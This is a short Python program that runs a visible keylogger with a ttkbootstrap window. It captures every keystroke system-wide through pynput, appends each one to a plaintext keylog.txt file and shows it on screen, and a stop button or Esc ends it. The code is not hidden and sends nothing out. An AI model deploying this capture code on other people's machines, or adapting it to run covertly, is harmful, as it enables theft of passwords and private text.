import os 
from pynput import keyboard
#optional - you import mouse as well to track mouse input
from pynput import mouse
import ttkbootstrap as ttk
from ttkbootstrap.constants import *
from tkinter import scrolledtext


class KeyLogger:
    def __init__(self, root):
        self.root = root
        self.root.title("typetrack.")
        self.root.geometry("600x400")

        self.log_file = "keylog.txt"
        self.listener = None

        self.setup_ui()

        #keylogger starts here
        self.start_keylogger()


    def setup_ui(self):
        frame = ttk.Frame(self.root, padding=10)
        frame.pack(fill=BOTH, expand=True)

        #to show log display
        self.log_display = scrolledtext.ScrolledText(frame, wrap=WORD, height=15, width=70)
        self.log_display.pack(padx=10, pady=10)

        self.stop_button = ttk.Button(frame, text="stop", command=self.stop_keylogger, bootstyle=PRIMARY)
        self.stop_button.pack(pady=10)

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def on_press(self, key):
        try:
            key_str = f'{key.char}'
        except AttributeError:
            key_str =f'{key}'
        
        self.log_to_file(key_str)
        self.update_log_display(key_str)
    
    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False
    
    def log_to_file(self, key_str):
        with open(self.log_file, "a") as log_file:
            log_file.write(key_str)
    
    def update_log_display(self, key_str):
        self.log_display.insert(END, key_str)
        self.log_display.see(END)

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
        self.root.quit()

if __name__ == "__main__":
    root = ttk.Window(themename="darkly")
    app = KeyLogger(root)
    root.mainloop()
